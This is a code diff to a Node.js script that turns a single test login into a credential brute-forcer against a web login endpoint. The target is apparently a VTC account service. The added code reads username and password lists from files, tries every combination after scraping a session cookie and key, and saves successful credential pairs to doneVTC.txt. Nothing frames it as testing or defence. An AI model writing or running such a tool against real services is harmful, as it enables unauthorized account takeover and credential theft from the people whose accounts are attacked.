@@ -6,6 +6,8 @@
 
 const cheerio = require('cheerio')
 const axios = require('axios')
+const fs = require("async-file")
+const fset = require("fs")
 
 async function getKey() {
     try {
@@ -50,19 +52,59 @@ async function doLogin(user, pass, cookieSession, key) {
             timeout: 5000,
             data: 'conten=' + new Buffer(user).toString("base64") + '&value=' + new Buffer(pass).toString("base64") +'&capt=&hidverify=&isRemember=false&key='+key+'&otp=&otpType=1&returnURL=http%3A%2F%2Flocalhost%3A3955%2F:'
         })
-        console.log(login.data)
+        return login.data
     } catch (error) {
         console.log(error)
     }
 }
 
+async function tryLogin(user, pass) {
+    try {
+        let getKeyandHeaders = await getKey()
+        var cookieSession = new RegExp('[; ]ASP.NET_SessionId=([^\\s;]*)');
+        cookieSession = (' ' + getKeyandHeaders.headers["set-cookie"][0]).match(cookieSession);
+        cookieSession = unescape(cookieSession[1]);
+        let doItLogin = await doLogin(user, pass, cookieSession, getKeyandHeaders.key)
+        if (doItLogin.ResponseStatus == 999) {
+            done(user+':'+pass)
+        }
+    } catch (error) {
+        console.log(error)
+    }
+}
+
+async function done(data) {
+    fset.open('./doneVTC.txt', 'a', 755, function (e, id) {
+        fset.write(id, data + "\r\n", null, 'utf8', function () {
+            fset.close(id, function () {
+                console.log('Success: ' + data);
+            });
+        });
+    })
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
 (async () => {
     try {
-        let getKeyandHeaders =  await getKey()
-        var cookieSession = new RegExp('[; ]ASP.NET_SessionId=([^\\s;]*)');
-            cookieSession = (' ' + getKeyandHeaders.headers["set-cookie"][0]).match(cookieSession);
-            cookieSession = unescape(cookieSession[1]);
-        await doLogin('systesm4', 'taolavip', cookieSession, getKeyandHeaders.key)
+        let user = await fs.readFile('./user.txt', { encoding: 'utf8' });
+        let pass = await fs.readFile('./pass.txt', { encoding: 'utf8' });
+
+        user = user.split(/\r?\n/);
+        pass = pass.split(/\r?\n/);
+
+        for (let i = 0; i < user.length; i++) {
+            const username = user[i];
+            for (let j = 0; j < pass.length; j++) {
+                const password = pass[j];
+                tryLogin(username, password)
+                console.log("Checking: "+username+':'+password)
+                sleep(500)
+            }
+        }
+
     } catch (error) {
         console.log(error)
     }
